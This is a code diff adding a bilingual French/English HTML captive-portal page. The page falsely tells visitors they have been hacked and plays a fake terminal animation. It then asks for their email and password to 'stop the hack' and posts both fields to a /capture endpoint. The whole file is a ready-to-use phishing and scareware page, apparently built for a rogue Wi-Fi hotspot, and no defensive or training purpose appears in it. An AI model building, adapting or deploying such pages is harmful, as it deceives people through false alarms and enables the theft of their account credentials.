@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portail Captif - Vous avez été hacké !</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #f00;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .language-selection {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        .language-selection button {
+            margin: 0 5px;
+            padding: 5px 10px;
+            background-color: #333;
+            color: #f00;
+            border: 1px solid #f00;
+            cursor: pointer;
+        }
+        .language-selection button.selected {
+            background-color: #f00;
+            color: #000;
+        }
+        .main-content {
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+        .logo {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            margin: 20px auto;
+        }
+        h1 {
+            font-size: 28px;
+            margin: 20px 0;
+            color: #f00;
+            text-shadow: 0 0 10px #f00;
+        }
+        p {
+            font-size: 18px;
+            margin: 20px 0;
+            color: #f00;
+        }
+        .input-container {
+            margin: 10px 0;
+        }
+        .input-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #f00;
+        }
+        .input-container input {
+            padding: 8px;
+            width: 100%;
+            font-size: 14px;
+            background-color: #000;
+            color: #f00;
+            border: 1px solid #f00;
+        }
+        #accept-button {
+            padding: 10px 20px;
+            background-color: #f00;
+            color: #000;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 20px 0;
+        }
+        #accept-button:hover {
+            background-color: #c00;
+        }
+        .terminal {
+            background-color: #000;
+            border: 1px solid #f00;
+            padding: 10px;
+            margin: 20px 0;
+            height: 100px;
+            overflow-y: auto;
+            font-size: 14px;
+            text-align: left;
+            color: #f00;
+        }
+        .terminal p {
+            margin: 5px 0;
+        }
+        .skull {
+            width: 100px;
+            height: 100px;
+            margin: 20px auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selection">
+        <button id="lang-en">English</button>
+        <button id="lang-fr">Français</button>
+    </div>
+    <div class="main-content">
+        <svg class="skull" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+            <path fill="#f00" d="M32 0C14.4 0 0 14.4 0 32s14.4 32 32 32 32-14.4 32-32S49.6 0 32 0zm0 60C16.5 60 4 47.5 4 32S16.5 4 32 4s28 12.5 28 28-12.5 28-28 28z"/>
+            <circle fill="#000" cx="20" cy="25" r="5"/>
+            <circle fill="#000" cx="44" cy="25" r="5"/>
+            <path fill="#000" d="M32 40c-6 0-10 4-10 10h20c0-6-4-10-10-10z"/>
+        </svg>
+        <h1 id="title">Vous avez été hacké !</h1>
+        <div class="terminal" id="terminal">
+            <p>$ initiation de la séquence de hack...</p>
+            <p>$ contournement du pare-feu...</p>
+            <p>$ accès au mainframe...</p>
+            <p>$ téléchargement des données sensibles...</p>
+        </div>
+        <p id="paragraph">Vos données sont compromises. Entrez vos identifiants pour arrêter le hack.</p>
+        <form action="/capture" method="post">
+            <div class="input-container">
+                <label id="email-label">Email :</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="input-container">
+                <label id="password-label">Mot de passe :</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" id="accept-button">Arrêter le Hack</button>
+        </form>
+    </div>
+    <script>
+        const translations = {
+            en: {
+                title: "You Have Been Hacked!",
+                paragraph: "Your data is compromised. Enter your credentials to stop the hack.",
+                button: "Stop the Hack",
+                emailLabel: "Email:",
+                passwordLabel: "Password:"
+            },
+            fr: {
+                title: "Vous avez été hacké !",
+                paragraph: "Vos données sont compromises. Entrez vos identifiants pour arrêter le hack.",
+                button: "Arrêter le Hack",
+                emailLabel: "Email :",
+                passwordLabel: "Mot de passe :"
+            }
+        };
+
+        let currentLang = 'fr';
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            document.getElementById('title').textContent = translations[lang].title;
+            document.getElementById('paragraph').textContent = translations[lang].paragraph;
+            document.getElementById('accept-button').textContent = translations[lang].button;
+            document.getElementById('email-label').textContent = translations[lang].emailLabel;
+            document.getElementById('password-label').textContent = translations[lang].passwordLabel;
+
+            document.getElementById('lang-en').classList.toggle('selected', lang === 'en');
+            document.getElementById('lang-fr').classList.toggle('selected', lang === 'fr');
+        }
+
+        setLanguage('fr');
+
+        document.getElementById('lang-en').addEventListener('click', () => setLanguage('en'));
+        document.getElementById('lang-fr').addEventListener('click', () => setLanguage('fr'));
+
+        // Simulation du terminal
+        const terminal = document.getElementById('terminal');
+        const messages = [
+            "$ initiation de la séquence de hack...",
+            "$ contournement du pare-feu...",
+            "$ accès au mainframe...",
+            "$ téléchargement des données sensibles...",
+            "$ hack en cours... vos fichiers sont en danger !"
+        ];
+        let index = 0;
+        setInterval(() => {
+            if (index < messages.length) {
+                const p = document.createElement('p');
+                p.textContent = messages[index];
+                terminal.appendChild(p);
+                terminal.scrollTop = terminal.scrollHeight;
+                index++;
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
